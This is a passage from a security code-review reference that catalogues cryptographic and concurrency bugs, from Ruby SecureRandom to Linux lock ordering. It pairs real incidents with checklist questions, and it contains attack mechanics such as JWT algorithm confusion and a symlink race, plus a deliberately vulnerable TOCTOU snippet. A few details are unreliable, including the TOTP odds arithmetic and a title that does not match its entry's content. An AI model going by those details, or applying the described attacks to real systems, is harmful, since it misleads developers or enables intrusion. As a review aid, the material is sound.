**Review Pattern:** CONSTANT_TIME_COMPARE — "Is secret comparison using a constant-time
function (HMAC comparison, crypto/subtle.ConstantTimeCompare, timingsafe_bcmp)?"

### C13. Math/rand for Security Purposes — Ruby SecureRandom Fallback
**Project:** Ruby standard library | **Severity:** High | **Discovered:** Various
**Incident:** Ruby's SecureRandom class historically fell back to OpenSSL::Random, which
in some configurations used a PID-seeded PRNG, producing predictable "random" values
**The Bug:** Using math/rand (Go), random (Python), Math.random() (JavaScript), or
similarly inadequate random sources for security-sensitive operations (tokens, nonces,
session IDs). Ruby's SecureRandom was supposed to be the secure alternative to Kernel#rand,
but its implementation fell back through a chain: /dev/urandom (good), then OpenSSL::Random
(acceptable), then potentially a PID-seeded PRNG if OpenSSL was not properly initialized.
In forked processes (common in Ruby web servers like Unicorn), the OpenSSL PRNG state was
duplicated across child processes without reseeding, meaning multiple forked workers
produced identical "random" sequences. This made session tokens, CSRF tokens, and other
security-sensitive values predictable across workers.
**Why Missed:** The class is literally named "SecureRandom" — developers trusted the name.
The fallback chain was an implementation detail hidden inside the standard library. The
fork-without-reseed issue only manifested in production-like multi-process deployments,
not in single-process development or testing environments.
**Review Pattern:** CRYPTO_RANDOM — "Is the random number generator cryptographically
secure for all security-sensitive uses? math/rand, random, Math.random() are NOT."

### C14. Hardcoded Cryptographic Keys — Uber AWS Key Leak (2016)
**Project:** Uber | **Severity:** Critical | **Discovered:** 2016
**Incident:** Uber's hardcoded AWS access keys in a GitHub repository led to the 2016
breach exposing 57 million user records (see also A6)
**The Bug:** Cryptographic keys, API secrets, or JWT signing keys hardcoded in source code
or configuration files committed to version control. Uber developers committed AWS access
keys directly into source code in a private GitHub repository. When attackers gained
access to the repository, they extracted the AWS credentials and used them to access S3
buckets containing personal data of 57 million riders and drivers. The keys had broad
permissions (they could access the S3 bucket containing the user database) and had no
rotation policy. The incident cost Uber a $148 million settlement with the FTC and led
to criminal charges against the CISO who attempted to conceal the breach by disguising
the extortion payment as a bug bounty.
**Why Missed:** Hardcoding credentials is the fastest way to get code working. Private
repositories feel secure. The intention is always to "move it to a config file later"
but that never happens. Git's immutable history means even deleted secrets persist in
older commits.
**Review Pattern:** HARDCODED_SECRETS — "Are any cryptographic keys, secrets, or passwords
hardcoded in source code? Are secret files in .gitignore?"

### C15. Certificate Validation Disabled — POODLE Workarounds (CVE-2014-3566)
**Project:** Various applications | **Severity:** High | **Discovered:** 2014-ongoing
**Incident:** After POODLE (CVE-2014-3566), many developers disabled TLS certificate
verification as a "fix" instead of properly configuring TLS versions, creating a worse
vulnerability than the one they were trying to address
**The Bug:** TLS certificate verification disabled for debugging and left disabled:
`verify=False`, `InsecureSkipVerify: true`, `NODE_TLS_REJECT_UNAUTHORIZED=0`. After the
POODLE vulnerability (CVE-2014-3566) was disclosed, many applications experienced TLS
connection failures when servers or clients changed their TLS configurations. Developers
"fixed" these failures by disabling certificate verification entirely — trading a complex
but bounded cryptographic vulnerability for a trivially exploitable man-in-the-middle
attack surface. The pattern persists in development (where self-signed certificates are
common) leaking into production configurations. GitHub code search reveals millions of
instances of `verify=False` in Python code and `InsecureSkipVerify: true` in Go code.
**Why Missed:** Disabling certificate verification makes TLS errors disappear. The code
works, connections succeed, and there's no visible failure. The MITM vulnerability is
invisible in normal operation — it only manifests when an attacker is actively intercepting.
The "TODO: enable cert verification in production" comment is a well-known phenomenon.
**Review Pattern:** CERT_VERIFY — "Is TLS certificate verification enabled? Search for
InsecureSkipVerify, verify=False, REJECT_UNAUTHORIZED=0."

### C16. Weak Password Hashing — LinkedIn Breach (2012)
**Project:** LinkedIn | **Severity:** Critical | **Discovered:** 2012
**Incident:** LinkedIn breach (2012) — 6.5 million unsalted SHA-1 password hashes leaked,
cracked within days; later revealed to be 117 million total accounts
**The Bug:** Using MD5, SHA-1, or unsalted SHA-256 for password hashing instead of bcrypt,
scrypt, or Argon2. LinkedIn stored passwords as unsalted SHA-1 hashes. When the hash
database was stolen in 2012, the lack of salts meant that identical passwords had
identical hashes, enabling immediate frequency analysis. The speed of SHA-1 (billions
per second on GPU) meant that dictionary attacks and rule-based cracking recovered the
majority of passwords within days. "123456" appeared over 700,000 times with the same
hash value. The breach demonstrated why general-purpose hash functions (SHA-1, SHA-256,
MD5) are unsuitable for password storage — they're designed to be fast, while password
hashing must be deliberately slow (bcrypt's work factor, scrypt's memory hardness, or
Argon2's configurable cost).
**Why Missed:** "We hash passwords" was considered sufficient security practice. The
distinction between a cryptographic hash function (SHA-1) and a password hash function
(bcrypt) is subtle — both are called "hashing." Without understanding the threat model
(offline brute force with GPUs), SHA-1 seems adequate.
**Review Pattern:** PASSWORD_HASH — "Is password hashing using a dedicated password hash
function (bcrypt, scrypt, Argon2) with per-user salt?"

### C17. Predictable Session Tokens — Moonpig API (2015)
**Project:** Moonpig (UK greeting card company) | **Severity:** Critical | **Discovered:** 2015
**Incident:** Moonpig API vulnerability disclosed by Paul Price (2015) — customer account
IDs were sequential integers used directly as authentication tokens, exposing 3 million
customer records
**The Bug:** Session tokens generated using predictable values (timestamp, sequential
counter, weak PRNG seeded with time). Moonpig's mobile API used sequential customer IDs
as the sole authentication token. The API accepted requests like
`GET /api/customer/12345/orders` with no additional authentication — knowing or guessing
a customer's numeric ID was sufficient to access their account, including personal
details, addresses, and order history. Since the IDs were sequential integers, an
attacker could trivially enumerate all 3 million customer accounts. The researcher
reported the issue in August 2013, but Moonpig did not fix it for 17 months until public
disclosure in January 2015 forced their hand.
**Why Missed:** The customer ID looked like an "internal" identifier rather than a
security token. The distinction between "identifier" (can be public) and "authenticator"
(must be secret/unpredictable) was blurred. The API worked correctly for legitimate use.
**Review Pattern:** SESSION_ENTROPY — "Are session tokens generated with a CSPRNG with at
least 128 bits of entropy?"

### C18. Key Derivation Without Salt — PBKDF2 with Iteration Count of 1
**Project:** Various applications | **Severity:** High | **Discovered:** Ongoing
**Incident:** Multiple documented incidents of PBKDF2 used with an iteration count of 1,
including the 2013 disclosure of LastPass using only 500 iterations (later increased)
and numerous applications using the minimum iteration count
**The Bug:** Deriving encryption keys directly from passwords without using a proper KDF
(PBKDF2, HKDF, Argon2) or using a KDF with inadequate parameters. PBKDF2 is designed
to be slow — its iteration count parameter controls how many times the underlying hash
is applied. Using an iteration count of 1 reduces PBKDF2 to a single HMAC operation,
providing essentially no key-stretching benefit. Even security-focused applications like
password managers have been found using low iteration counts: LastPass was disclosed in
2013 to be using 500 iterations for some accounts (far below the recommended minimum of
100,000 for PBKDF2-SHA256). The problem extends to applications that call PBKDF2 with
the minimum valid parameter (1) because the API allows it and the developer treated the
iteration count as a required parameter to fill in, not a security-critical tuning knob.
**Why Missed:** PBKDF2 with 1 iteration compiles, runs, and produces deterministic output
that passes all functional tests. The security parameter (iteration count) looks like a
performance tuning knob, not a security setting. Low iterations mean faster tests, which
is a perverse incentive.
**Review Pattern:** KEY_DERIVATION — "Is key derivation from passwords using a proper KDF
with iteration count/memory cost AND per-context salt?"

### C19. RSA Key Size Too Small — Lenovo Superfish (2015)
**Project:** Lenovo / Superfish / Komodia | **Severity:** Critical | **Discovered:** 2015
**Incident:** Lenovo Superfish (2015) — pre-installed adware used a self-signed CA
certificate with the same RSA private key on every laptop, enabling trivial MITM attacks
on HTTPS traffic for millions of Lenovo customers
**The Bug:** Using weak or shared RSA keys, or deploying the same private key across
multiple devices. Lenovo pre-installed Superfish adware on consumer laptops. Superfish
installed a self-signed root CA certificate into the Windows trust store and used it to
MITM all HTTPS connections (to inject ads into encrypted pages). The critical failure
was that every Lenovo laptop shipped with the identical CA certificate and the same RSA
private key. Researcher Robert Graham extracted the private key in three hours — it was
protected by the password "komodia." Once the key was public, anyone on the same network
as a Lenovo laptop could perform a man-in-the-middle attack on all their HTTPS traffic,
including banking, email, and healthcare sites.
**Why Missed:** The Superfish software was treated as a business partnership/OEM bundling
decision, not a security review item. The CA certificate installation and HTTPS
interception were "features" of the adware. No security review was conducted on the
third-party software's cryptographic implementation.
**Review Pattern:** KEY_SIZE — "Are RSA keys at least 2048 bits? Are symmetric keys at
least 128 bits? Are ECC curves at least 256 bits?"

### C20. Insufficient Token Entropy — OAuth Token Predictability
**Project:** Various OAuth implementations | **Severity:** High | **Discovered:** Ongoing
**Incident:** Multiple OAuth implementations found to generate tokens with insufficient
entropy, including documented cases in older OAuth libraries where tokens were based on
timestamps or sequential values
**The Bug:** API tokens, CSRF tokens, or password reset tokens with less than 128 bits
of entropy, making them brutable. OAuth bearer tokens must be unpredictable to prevent
token guessing attacks (RFC 6750 explicitly states tokens must have sufficient entropy).
Multiple OAuth implementations have been found generating tokens by base64-encoding
timestamps, using short random strings (e.g., 8 hex characters = 32 bits of entropy),
or combining predictable components (user ID + timestamp) with a short random suffix.
At 32 bits of entropy, a token can be brute-forced with approximately 2 billion guesses
— achievable in hours with a fast API. Even at 64 bits, a determined attacker with
parallel requests can attempt the search. The minimum recommended entropy for security
tokens is 128 bits (16 bytes from a CSPRNG).
**Why Missed:** The tokens look "random enough" to human eyes. Short tokens are
convenient for URLs and logging. The connection between token length and brute-force
feasibility requires understanding the birthday bound and realistic attack throughput.
**Review Pattern:** TOKEN_LENGTH — "Do security tokens have at least 128 bits of entropy?
A 16-byte random value encoded in hex or base64."

### C21. Missing HSTS — Scott Helme's Security Headers Research
**Project:** Various web applications | **Severity:** Medium | **Discovered:** Ongoing
**Incident:** Scott Helme's securityheaders.com project (2015-present) demonstrated that
the majority of Alexa Top 1M websites lacked HSTS headers, and documented the practical
impact of SSL stripping attacks
**The Bug:** HTTPS-only sites without Strict-Transport-Security header, allowing SSL
stripping attacks on first visit. Security researcher Scott Helme created securityheaders.
com, which scans websites for security headers and grades them. His ongoing research found
that the vast majority of websites — even those that redirect HTTP to HTTPS — lack the
HSTS header. Without HSTS, a user's first visit (or any visit after the HSTS max-age
expires) can be intercepted by an active network attacker who strips the HTTPS redirect,
keeping the user on HTTP. This attack, demonstrated by Moxie Marlinspike in 2009 with
his sslstrip tool, remains practical on public WiFi networks and anywhere an attacker
controls the network. HSTS preloading (submitting to browser preload lists) eliminates
even the first-visit vulnerability.
**Why Missed:** The site "uses HTTPS" — it has a certificate and redirects HTTP to HTTPS.
The missing HSTS header doesn't cause any visible failure. SSL stripping attacks require
an active network attacker, which feels like a narrow threat model.
**Review Pattern:** HSTS_HEADER — "Does the HTTPS site set Strict-Transport-Security with
appropriate max-age?"

### C22. Mixed Content — Banking Site Research
**Project:** Various banking and financial sites | **Severity:** Medium-High | **Discovered:** Ongoing
**Incident:** Documented research by security researchers including Troy Hunt and Scott
Helme showing major banking sites loading JavaScript resources over HTTP, enabling code
injection by network attackers
**The Bug:** HTTPS pages loading resources (scripts, stylesheets) over HTTP, allowing
content injection by a network attacker. Even when a banking site's main page is served
over HTTPS, loading a JavaScript file, analytics script, or CSS stylesheet over plain
HTTP allows a network attacker to modify that resource in transit. A malicious script
injected this way runs in the context of the HTTPS page, with full access to the DOM,
cookies, and form data. Security researchers documented this pattern across financial
institutions, healthcare portals, and government sites — organizations that invested
heavily in HTTPS certificates but failed to ensure all sub-resources also used HTTPS.
Modern browsers now block "active" mixed content (scripts, iframes) by default, but
older browsers allowed it, and "passive" mixed content (images) can still leak information.
**Why Missed:** The main page URL shows HTTPS and the lock icon displays (in older
browsers). Sub-resource loading happens in HTML or JavaScript that may reference CDN
URLs or third-party resources with hardcoded `http://` prefixes. The mixed content is
invisible to users and often to developers reviewing the main application code.
**Review Pattern:** MIXED_CONTENT — "Are all resources loaded over HTTPS? Is there a
Content-Security-Policy upgrade-insecure-requests directive?"

### C23. Signature Validation Bypass via Key Confusion — PyJWT (CVE-2017-11424)
**Project:** PyJWT | **Severity:** Critical | **Discovered:** 2017
**Incident:** CVE-2017-11424 — PyJWT allowed algorithm confusion where an attacker could
forge tokens by signing with HMAC using the RSA public key as the HMAC secret
**The Bug:** JWT libraries accepting HMAC-signed tokens verified with the RSA public key
as the HMAC secret key, bypassing signature verification. CVE-2017-11424 in PyJWT
(Python's most popular JWT library) allowed an attacker who knew the RSA public key
(which is, by definition, public) to forge JWT tokens. The attack: the server expects
RS256 (RSA) signed tokens and verifies with its RSA public key. The attacker creates a
token with `"alg": "HS256"` (HMAC) and signs it using the RSA public key as the HMAC
secret. The server reads the algorithm from the token header, sees "HS256", and uses its
"verification key" (the RSA public key) as the HMAC key — and the signature verifies.
This gave the attacker the ability to forge arbitrary tokens. The same vulnerability
affected JWT libraries in multiple languages.
**Why Missed:** The library correctly implemented both RS256 and HS256 algorithms. The bug
was in accepting the algorithm from the untrusted token header instead of requiring the
application to specify which algorithm to expect. The type confusion between asymmetric
and symmetric keys is subtle — both are "keys" in the API.
**Review Pattern:** KEY_TYPE_CHECK — "Is the cryptographic key type verified before use?
Can a public key be used as a symmetric key?"

### C24. Missing Certificate Pinning — DigiNotar CA Compromise (2011)
**Project:** DigiNotar Certificate Authority | **Severity:** Critical | **Discovered:** 2011
**Incident:** DigiNotar CA compromise (2011) — attackers issued fraudulent certificates
for google.com, *.google.com, and other high-value domains, enabling mass surveillance
of Iranian Gmail users
**The Bug:** Applications making critical API calls without certificate pinning, vulnerable
to CA compromise or misissued certificates. In 2011, the DigiNotar Certificate Authority
was compromised by attackers who issued fraudulent TLS certificates for over 500 domains,
including *.google.com, cia.gov, and mozilla.org. The fraudulent Google certificate was
used to perform man-in-the-middle attacks on Gmail users in Iran, intercepting email
communications in what appeared to be a state-sponsored surveillance operation. The attack
was detected because Google Chrome had implemented certificate pinning for Google
domains — Chrome rejected the fraudulent DigiNotar-issued certificate even though it was
technically valid according to the normal CA trust model. Without Chrome's pinning, the
attack would have been undetectable by end users. DigiNotar was subsequently revoked from
all browser trust stores and went bankrupt.
**Why Missed:** The CA trust model is designed so that any trusted CA can issue a
certificate for any domain. Certificate pinning was a new concept in 2011 and was not
standard practice. The assumption that "CAs are trustworthy" was the foundation of the
entire PKI system.
**Review Pattern:** CERT_PINNING — "For critical connections, is certificate pinning
implemented as defense-in-depth?"

### C25. Time-based OTP Window Too Large — Various TOTP Implementation Issues
**Project:** Various 2FA implementations | **Severity:** Medium | **Discovered:** Ongoing
**Incident:** Multiple documented cases of TOTP implementations with excessively large
acceptance windows (accepting codes from 10+ time steps), and implementations that
failed to prevent code reuse within the acceptance window
**The Bug:** TOTP implementations accepting codes from too many time windows, reducing
brute-force difficulty. RFC 6238 specifies TOTP with 30-second time steps and recommends
a small acceptance window to account for clock drift. However, implementations frequently
expand this window far beyond what's necessary: some accept codes from 10 or more time
steps (5 minutes) in each direction, reducing the effective keyspace from 1-in-1,000,000
to 1-in-10,000,000 per 10-minute window — but more critically, enabling code reuse.
Without server-side tracking of used codes, the same valid TOTP code can be replayed
multiple times within its acceptance window. An attacker who observes a code entry
(shoulder surfing, camera) has a multi-minute window to replay it, defeating the purpose
of a time-based one-time password.
**Why Missed:** A larger acceptance window reduces user complaints about "my code didn't
work" due to clock drift. The security impact of window size is quantitative, not binary —
it's not "broken," it's "weaker." Code reuse prevention requires server-side state, which
adds implementation complexity.
**Review Pattern:** OTP_WINDOW — "Is the TOTP acceptance window limited to 1-2 time steps?"

---

## Race Conditions & Concurrency (25 entries)

### R1. Dirty COW — Linux kernel (CVE-2016-5195)
**Project:** Linux kernel | **Severity:** Critical | **Discovered:** 2016 (present since 2007)
**The Bug:** A race condition in the kernel's copy-on-write mechanism. When a thread
triggered a COW fault while another thread simultaneously called madvise(MADV_DONTNEED),
the kernel could write to a read-only memory mapping, including read-only files.
**Root Cause:** The madvise call could race with the page fault handler between the point
where the COW copy was made and the point where the page table entry was updated. The
kernel could end up writing to the original page instead of the copy.
**Why Missed:** The race window was extremely narrow. The COW mechanism was well-tested for
correctness in the non-concurrent case. The interaction between madvise and the page fault
handler was a corner case of a corner case.
**Review Pattern:** COW_RACE — "In copy-on-write or deferred-copy operations, is the
'replace old with new' step atomic? Can another operation invalidate the copy between
creation and installation?"

### R2. Dirty Pipe — Linux kernel (CVE-2022-0847)
**Project:** Linux kernel | **Severity:** Critical | **Discovered:** 2022
**The Bug:** A race in pipe buffer management allowed writing to pages that were also mapped
into file page caches, enabling modification of read-only files (including SUID binaries).
The `PIPE_BUF_FLAG_CAN_MERGE` flag was not properly cleared when a pipe page was spliced
from a file.
**Root Cause:** When splice() moved file pages into a pipe, the pipe buffer flags from the
previous pipe buffer entry weren't cleared. A subsequent write() to the pipe could merge
data into the file-backed page, modifying the cached file content.
**Why Missed:** The bug was in the interaction between splice(), pipe buffering, and the
page cache. Each component was correct individually. The flag inheritance across splice
operations was a subtle implementation detail.
**Review Pattern:** FLAG_INHERITANCE — "When data structures are moved between contexts
(splice, migration, handoff), are all metadata/flags appropriate for the new context?
Should any flags be cleared?"

### R3. TOCTOU in File Operations — General pattern
**Project:** Various (Linux, BSD, applications) | **Severity:** Medium-High
**The Bug:** Time-of-check-to-time-of-use races in file operations:
```c
if (access(path, R_OK) == 0) {  // check
    fd = open(path, O_RDONLY);   // use — file could have changed
}
```
**Root Cause:** Between the permission check and the file open, an attacker can replace the
file (e.g., via symlink race). The checked path and the opened file are different.
**Why Missed:** The code follows a seemingly reasonable pattern: check first, then use. The
race window is real but narrow, making testing difficult.
**Review Pattern:** TOCTOU_FILE — "Is file access checked and used in separate operations?
Use open-then-fstat (check after open) or O_NOFOLLOW to prevent symlink races."

### R4. Signal Handler Races — POSIX/C
**Project:** Various C programs | **Severity:** High
**The Bug:** Signal handlers calling non-async-signal-safe functions (malloc, printf,
syslog), leading to deadlocks, data corruption, or exploitable state when the signal
interrupts a non-reentrant function.
**Root Cause:** POSIX signal handlers can interrupt any instruction, including the middle
of functions like malloc. If the handler calls malloc too, the heap data structures are
corrupted. The list of async-signal-safe functions is very short.
**Why Missed:** Signal handlers look like normal functions and typically work correctly in
testing. The corruption only occurs when the signal arrives during a vulnerable window,
which is rare but exploitable.
**Review Pattern:** SIGNAL_SAFETY — "Does every signal handler call only async-signal-safe
functions? The safe list is short: write, _exit, sig_atomic_t operations. Most stdio,
malloc, and logging functions are NOT safe."

### R5-R25. Additional Concurrency Bugs

### R5. MySQL InnoDB Double-Write Race
**Project:** MySQL/InnoDB | **Severity:** High | **Discovered:** 2014
**Incident:** MySQL Bug #73365 and related InnoDB crash recovery issues
**The Bug:** A race condition in InnoDB's double-write buffer could lead to data corruption
during crash recovery under specific timing conditions. The double-write mechanism, designed
to protect against partial page writes during power failure, had a window where the
double-write buffer and the actual tablespace page could become inconsistent if a crash
occurred at precisely the wrong moment during the buffer flush sequence.
**Why Missed:** The double-write buffer was specifically designed as a crash-safety
mechanism. Testing crash recovery requires simulating power failure at exact timing points,
which is difficult to do systematically. The race window was extremely narrow.
**Review Pattern:** CRASH_CONSISTENCY — "Is crash recovery correct? If power fails between
any two writes, is the data structure consistent?"

### R6. PostgreSQL Concurrent DDL Races (CVE-2014-0062)
**Project:** PostgreSQL | **Severity:** Medium | **Discovered:** 2014
**Incident:** CVE-2014-0062 — race condition in CREATE INDEX CONCURRENTLY and other DDL
**The Bug:** Concurrent DDL operations (ALTER TABLE while SELECT is running) could cause
crashes or incorrect results due to missing lock acquisitions. In CVE-2014-0062, the
CREATE INDEX CONCURRENTLY operation had a race where a concurrent session could see a
partially-built index, and table DDL operations did not acquire sufficiently strong locks
before examining table structure, allowing concurrent schema changes to produce corrupt
or inconsistent results.
**Why Missed:** PostgreSQL's MVCC model normally handles concurrency well for DML. DDL
concurrency is rarer and harder to reason about. The lock acquisition patterns were complex,
involving multiple lock levels and upgrade sequences.
**Review Pattern:** DDL_LOCKING — "Are schema-modifying operations properly serialized with
concurrent reads? Is the lock ordering consistent to prevent deadlocks?"

### R7. Go Map Concurrent Access Fatal Crash
**Project:** Go runtime | **Severity:** High | **Discovered:** Go 1.6 (2016)
**Incident:** Go 1.6 added fatal crash detection for concurrent map access after numerous
production crash reports across the Go ecosystem
**The Bug:** Go maps are not thread-safe. Before Go 1.6, concurrent read+write on a map
caused silent data corruption — corrupted map internals, missing keys, phantom entries, or
segfaults. This caused so many production incidents that the Go team added explicit runtime
detection in Go 1.6: concurrent map access now causes a fatal panic with a clear error
message rather than silent corruption. The decision to make this fatal (rather than merely
logging) reflected how serious and widespread the problem was.
**Why Missed:** Maps feel like a basic data type that "should just work." In single-threaded
code they do. The unsafety only manifests under concurrent access, which may be rare in
testing but common in production under load.
**Review Pattern:** CONCURRENT_MAP — "Is any map/dict accessed by multiple goroutines/
threads? Use sync.Map, mutexes, or channels."

### R8. Java ConcurrentModificationException Patterns
**Project:** Java Collections Framework | **Severity:** Medium-High | **Discovered:** Ongoing
**Incident:** One of the most-reported categories in the Java Bug Parade (Sun/Oracle bug
tracker), with thousands of reports across the Java ecosystem
**The Bug:** Iterating over a collection while another thread modifies it, or modifying
during for-each iteration. Java's fail-fast iterators throw ConcurrentModificationException,
but only on a best-effort basis — the real danger is when the exception is NOT thrown and
iteration silently skips or duplicates elements. The ArrayList, HashMap, and HashSet
iterators all share this behavior. In multi-threaded contexts, the modification may happen
between hasNext() and next() calls, producing corrupted iteration state.
**Why Missed:** The code pattern looks natural: iterate and conditionally remove. In
single-threaded tests it may work (fail-fast detection is not guaranteed). The race only
manifests under concurrent access patterns that differ from test workloads.
**Review Pattern:** ITERATOR_SAFETY — "Is any collection iterated while potentially being
modified? Use concurrent collections or copy-on-write patterns."

### R9. Double-Checked Locking Broken Pattern
**Project:** Java / C++ | **Severity:** High | **Discovered:** 1990s-2004
**Incident:** JSR-133 (Java Memory Model revision, 2004) — the broken double-checked
locking pattern was a primary motivation for revising the Java Memory Model
**The Bug:** The classic broken double-checked locking in Java (before volatile fix),
C++03, and other languages without proper memory ordering. In Java before JSR-133,
a thread could observe a non-null reference to a partially-constructed object: the
reference assignment could be reordered before the constructor completed. The pattern
was so widely used and so widely broken that it motivated a fundamental revision of the
Java Memory Model. JSR-133 (effective in Java 5) fixed the semantics of `volatile` to
provide the necessary happens-before guarantee that makes DCL safe when the field is
declared volatile.
**Why Missed:** The pattern looks correct: check, lock, check again, initialize. The bug
is invisible in the source code — it exists in the memory model's reordering rules, which
are not apparent from reading Java code. Most testing never reveals the bug because modern
CPUs rarely reorder in ways that trigger it on x86.
**Review Pattern:** DCL_MEMORY_ORDER — "Does double-checked locking use proper memory
ordering (volatile in Java 5+, memory_order_acquire in C++11)?"

### R10. ABA Problem in Lock-Free Data Structures
**Project:** Linux kernel (SLUB allocator) | **Severity:** High | **Discovered:** Various
**Incident:** Linux kernel SLUB allocator ABA issues — the freelist pointer reuse in
SLUB's lock-free fast path had ABA vulnerabilities exploited in kernel exploitation research
**The Bug:** Compare-and-swap succeeds because the value matches, but the referenced
data has been freed and reallocated — the same pointer, different object. In the Linux
kernel's SLUB allocator, the lock-free fast path used a simple compare-and-swap on
freelist pointers. An object could be freed, its memory reused for a new allocation, and
the same pointer value would appear on the freelist again. A concurrent CAS operation
would succeed even though the freelist structure had changed. This was leveraged in
multiple kernel exploitation techniques to achieve use-after-free conditions.
**Why Missed:** The CAS appears correct — it checks that the pointer hasn't changed. The
subtlety is that "same pointer value" doesn't mean "same state." ABA requires understanding
the full lifecycle of the pointed-to memory, not just the pointer value.
**Review Pattern:** ABA_PROTECTION — "Do lock-free algorithms protect against ABA?
Use tagged pointers, hazard pointers, or epoch-based reclamation."

### R11. Goroutine Leak on Channel Operations
**Project:** kubectl / Kubernetes | **Severity:** Medium | **Discovered:** Various
**Incident:** Multiple kubectl and Kubernetes controller memory leak bugs caused by
goroutine leaks (e.g., kubernetes/kubernetes#89612 and related issues)
**The Bug:** Goroutines blocked on channel send/receive that will never complete because
the other end has moved on, causing gradual memory exhaustion. In kubectl and various
Kubernetes controllers, goroutines spawned for watch operations, port-forwarding, or
log streaming would block on channel operations when connections were interrupted or
contexts were cancelled without proper cleanup. Over time, long-running kubectl processes
or controllers would accumulate thousands of leaked goroutines, each consuming stack
memory, eventually causing OOM kills.
**Why Missed:** Each goroutine individually appears to have a reasonable lifecycle. The
leak only manifests over time with specific error conditions (network interruption, context
cancellation) that don't occur in short-lived tests. Goroutine leaks are invisible unless
you monitor goroutine counts over time.
**Review Pattern:** GOROUTINE_LIFECYCLE — "For every goroutine: what causes it to exit?
Can the channel it's blocking on become unreachable?"

### R12. Thread Pool Starvation — Apache Tomcat (CVE-2014-0050)
**Project:** Apache Tomcat / Apache Commons FileUpload | **Severity:** High | **Discovered:** 2014
**Incident:** CVE-2014-0050 — multipart request parsing in Commons FileUpload could consume
all Tomcat request processing threads
**The Bug:** Thread pool exhausted by slow/blocking tasks, preventing other tasks from
executing. CVE-2014-0050 in Apache Commons FileUpload (used by Tomcat) allowed an attacker
to send a specially crafted multipart Content-Type header that caused the parser to enter
an extremely slow parsing path. Each malicious request held a thread for an extended
period while the parser struggled with the malformed boundary. A modest number of
concurrent malicious requests could consume all threads in Tomcat's request processing
pool, causing a complete denial of service for legitimate users.
**Why Missed:** The multipart parser was a well-tested utility. The slow path only triggered
with adversarial Content-Type headers that normal clients never produce. Thread pool
exhaustion is an emergent behavior — no single request appears dangerous.
**Review Pattern:** POOL_EXHAUSTION — "Can a slow task consume all threads in the pool?
Is there a timeout/deadline for pool tasks? Are blocking operations separated?"

### R13. Database Connection Pool Deadlock — HikariCP
**Project:** HikariCP / Java applications | **Severity:** Medium-High | **Discovered:** Ongoing
**Incident:** HikariCP's widely-discussed default pool sizing issues and the "Pool Size
About Right" analysis by Brett Wooldridge (HikariCP author)
**The Bug:** Transaction A holds connection 1 and waits for connection 2; Transaction B
holds connection 2 and waits for connection 1 (or the pool is simply exhausted). A
pervasive pattern in Java applications using HikariCP: the default maximum pool size
(10) combined with code that acquired multiple connections within a single request
(e.g., nested service calls each obtaining their own connection) could deadlock the
entire application. With a pool of 10 and 10 concurrent requests each needing 2
connections, all requests hold one connection and wait for a second that will never
become available. HikariCP's author published the "About Pool Sizing" analysis showing
that most applications set their pool far too large, masking rather than solving the
underlying design issue.
**Why Missed:** Each service method acquiring its own connection looks correct in isolation.
The deadlock only appears when multiple methods compose and the pool is under pressure.
Integration tests with low concurrency don't trigger the pool exhaustion.
**Review Pattern:** CONN_POOL_BOUND — "Can a single request hold multiple connections? Can
the pool size be exhausted by concurrent requests?"

### R14. Race in Lazy Initialization — Java SimpleDateFormat
**Project:** Java standard library / applications | **Severity:** Medium-High | **Discovered:** Ongoing
**Incident:** Java's SimpleDateFormat thread-unsafety — one of the most well-documented
concurrency pitfalls in Java, discussed extensively in Sun/Oracle bug reports and the
Java Concurrency in Practice book
**The Bug:** Multiple threads racing to initialize or use a shared singleton, creating
duplicate instances or partially-initialized objects. The canonical example is Java's
SimpleDateFormat: it is not thread-safe, but developers routinely share a single instance
across threads (as a static field or singleton) for "efficiency." Under concurrent access,
SimpleDateFormat produces garbled dates, throws NumberFormatException, or returns incorrect
results because its internal Calendar object is mutated during format/parse operations.
The lazy initialization variant compounds this: if the singleton is lazily created without
synchronization, multiple threads may each create their own instance, and partial
construction may be visible to other threads.
**Why Missed:** SimpleDateFormat's API gives no indication of thread-unsafety. Static
fields feel like a natural place to store a formatter. The corruption is intermittent
and data-dependent, so tests rarely catch it.
**Review Pattern:** INIT_ONCE — "Is lazy initialization of shared state protected by
sync.Once, std::call_once, or equivalent?"

### R15. File Lock Races Across Processes — nginx (CVE-2016-1247)
**Project:** nginx (Debian/Ubuntu packages) | **Severity:** High | **Discovered:** 2016
**Incident:** CVE-2016-1247 — nginx log file symlink race enabling privilege escalation
**The Bug:** Advisory file locks (flock) that aren't checked by all processes, or lock
files that can be deleted between check and use. CVE-2016-1247 was a symlink race in
nginx's log file handling on Debian/Ubuntu. The nginx log rotation script ran as root and
would create new log files after rotation. A local attacker with access to the www-data
user could replace the log file with a symlink between the point when the old log was
removed and the new log was created. When the logrotate script created the new file
following the symlink, it would write to an arbitrary location as root, enabling full
privilege escalation.
**Why Missed:** The logrotate script appeared straightforward: remove old log, signal
nginx to reopen. The TOCTOU window between file removal and recreation was narrow. The
attack required local access as www-data, which was not considered a high-risk scenario
during review.
**Review Pattern:** LOCK_ADVISORY — "Are file locks checked by ALL processes? Advisory
locks are only effective if everyone cooperates."

### R16. Event Loop Starvation in Node.js — DNS Resolution Blocking
**Project:** Node.js | **Severity:** Medium-High | **Discovered:** 2014 (Node.js v0.12 era)
**Incident:** Node.js DNS resolution blocking the event loop — a well-documented issue
in early Node.js where dns.lookup() used the libuv thread pool, which had only 4 threads
by default, causing event loop starvation under DNS-heavy workloads
**The Bug:** CPU-intensive or blocking synchronous code in Node.js event handlers blocks
the event loop, preventing I/O callbacks from executing. In Node.js v0.12 and earlier,
dns.lookup() (the default DNS resolution used by http.get and most networking) delegated
to the libuv thread pool, which defaulted to 4 threads. Under load, if DNS responses were
slow, all 4 threads would be occupied waiting for DNS, and every subsequent HTTP request
would queue behind them — effectively stalling the entire event loop. Applications would
appear frozen even though the event loop itself wasn't blocked; the thread pool was
saturated with blocking DNS calls.
**Why Missed:** dns.lookup was an "invisible" blocking operation — it used the async API
pattern (callbacks) but internally delegated to a limited thread pool. The starvation only
manifested under production DNS latency conditions, not in development.
**Review Pattern:** EVENT_LOOP_BLOCK — "Does any event handler perform CPU-intensive
synchronous work? Offload to worker threads."

### R17. Mutex Lock Ordering Violation — Linux Kernel Networking
**Project:** Linux kernel | **Severity:** High | **Discovered:** Ongoing
**Incident:** Recurring AB-BA deadlocks in the Linux kernel networking subsystem,
documented through numerous lockdep warnings and fixes in the netfilter, socket, and
routing layers
**The Bug:** Thread A locks mutex 1 then mutex 2; Thread B locks mutex 2 then mutex 1.
Classic deadlock. The Linux kernel networking subsystem has a long history of AB-BA
deadlocks between socket locks, netfilter locks, and routing table locks. The interaction
between the receive path (holding socket lock, needing routing lock), the control path
